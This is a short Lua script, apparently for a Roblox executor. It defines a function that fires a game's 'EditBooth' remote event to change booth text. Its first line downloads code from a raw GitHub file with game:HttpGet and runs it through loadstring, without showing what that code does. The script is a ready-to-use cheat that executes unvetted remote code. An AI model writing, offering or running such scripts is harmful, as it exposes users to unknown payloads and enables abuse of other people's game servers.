loadstring(game:HttpGet("https://raw.githubusercontent.com/vys001/Invite/main/invite.txt",true))()
function msg(text)
    local A_1 = text
local A_2 = "booth"
local event = game:GetService("ReplicatedStorage").Events.EditBooth
event:FireServer(A_1, A_2)
end
